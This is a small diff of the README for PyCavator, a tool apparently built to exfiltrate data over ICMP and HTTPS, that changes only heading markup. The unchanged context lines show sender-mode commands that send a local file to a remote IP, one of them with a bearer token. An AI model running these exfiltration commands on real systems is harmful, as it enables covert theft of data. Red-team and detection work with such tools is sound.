@@ -13,7 +13,7 @@ With PyCavator, users can easily exfiltrate or receive data using ICMP packets i
 <b>Required libraries:</b><br/>
 - All libraries are part of the default Python installation.<br/>
 
-<h3>Examples</h3>:
+#### Examples:
   <bSender mode: exfiltrate data from a file</b><br/>
   python pycavator-icmp.py -f input.txt -d 192.168.1.101
   
@@ -36,7 +36,7 @@ With PyCavator, users can easily exfiltrate or receive data using ICMP packets i
 - `ssl`: used for configuring SSL/TLS encryption<br/>
 - `urllib3`: used for disabling SSL warnings<br/>
 
-<h3>Examples:</h3>
+#### Examples:
   <b>Sender mode: exfiltrate data from a file</b><br/>
   ```bash
   python pycavator-https.py -f input.txt -d 192.168.1.101 -p 4443 -ca ca.pem -t "eyJhbGciO..._adQssw5c"
